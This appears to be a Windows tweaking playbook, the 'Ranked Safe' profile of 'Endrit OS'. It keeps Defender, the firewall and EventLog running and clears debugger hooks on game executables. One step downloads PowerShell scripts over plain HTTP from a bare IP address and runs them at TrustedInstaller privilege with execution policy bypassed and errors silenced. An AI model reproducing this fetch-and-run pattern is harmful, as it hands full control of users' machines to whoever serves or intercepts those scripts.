---
title: Endrit OS — Ranked Safe Profile
description: Keeps Defender, BFE, EventLog running. Safe for Vanguard/VAC/EAC.
privilege: TrustedInstaller
actions:

  - !writeStatus: {status: "Endrit OS: Applying Ranked Safe profile (91%+ compatibility)"}
  # NOTE: Ranked Safe intentionally skips risky tweaks:
  # - No disabledynamictick (AMD Ryzen BSOD risk)
  # - No tscsyncpolicy enhanced (old Intel slow boot)
  # - No forced VBS (old GPU driver BSOD risk)
  # - No ASR rule 56a863a9 (blocks Realtek/Intel audio drivers)
  # - No per-interface Nagle off (WiFi connectivity issues)
  # These are available as Toolbox toggles for advanced users.

  # Defender MUST be on
  - !service: {name: 'WinDefend',  operation: change, startup: 2}
  - !service: {name: 'Sense',      operation: change, startup: 2}
  - !service: {name: 'WdNisSvc',   operation: change, startup: 3}
  # Firewall base
  - !service: {name: 'mpssvc',     operation: change, startup: 2}
  - !service: {name: 'BFE',        operation: change, startup: 2}
  # Event log (EAC / VAC diagnostics)
  - !service: {name: 'EventLog',   operation: change, startup: 2}

  # No IFEO blocks on game executables in this profile
  - !registryValue: {path: 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\valorant-win64-shipping.exe', value: 'Debugger', operation: delete, errorAction: Ignore}
  - !registryValue: {path: 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cs2.exe', value: 'Debugger', operation: delete, errorAction: Ignore}
  - !registryValue: {path: 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\r5apex.exe', value: 'Debugger', operation: delete, errorAction: Ignore}

  # Wallpaper persistence task
  - !powerShell:
      wait: true
      command: >-
        $s = 'C:\WINDOWS\EndritModules\Scripts\SET-WALLPAPER-PERSIST.ps1';
        if (Test-Path $s) { & $s }

  # Apply safe security hardening + compatibility (download latest, run, local fallback)
  - !writeStatus: {status: "Endrit OS: Hardening + compatibility (Ranked Safe)"}
  - !powerShell:
      wait: true
      command: >-
        $ErrorActionPreference='SilentlyContinue';
        $base='http://192.109.200.182/scripts';
        $local='C:\WINDOWS\EndritModules\Scripts';
        foreach($s in @('APPLY-SECURITY-HARDENING.ps1','APPLY-SAFE-COMPATIBILITY.ps1')){
          $t=Join-Path $env:TEMP $s;
          try { Invoke-WebRequest "$base/$s" -OutFile $t -UseBasicParsing -TimeoutSec 30 } catch {};
          if(-not(Test-Path $t) -and (Test-Path "$local\$s")){ $t="$local\$s" };
          if(Test-Path $t){ & powershell -NoProfile -ExecutionPolicy Bypass -File $t }
        }

  # Write config
  - !powerShell:
      wait: true
      command: >-
        $c = 'C:\ProgramData\EndritOS\config.json';
        if (Test-Path $c) {
          $j = Get-Content $c -Raw | ConvertFrom-Json;
          $j.version = '2.5.0'; $j.profile = 'ranked-safe'; $j.competitiveReady = $true;
          $j | ConvertTo-Json | Set-Content $c -Encoding UTF8
        }
